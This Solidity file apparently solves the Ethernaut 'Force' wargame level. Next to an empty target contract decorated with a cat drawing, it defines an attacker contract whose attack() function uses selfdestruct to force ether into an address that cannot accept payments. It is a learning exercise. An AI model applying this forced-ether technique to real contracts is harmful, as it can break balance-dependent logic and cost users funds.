// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForcingSendEther {
    fallback() external payable {

    }

    function attack(address _problemAddress) public payable{
        address payable addr = payable(_problemAddress);
        selfdestruct(addr);
    }
}
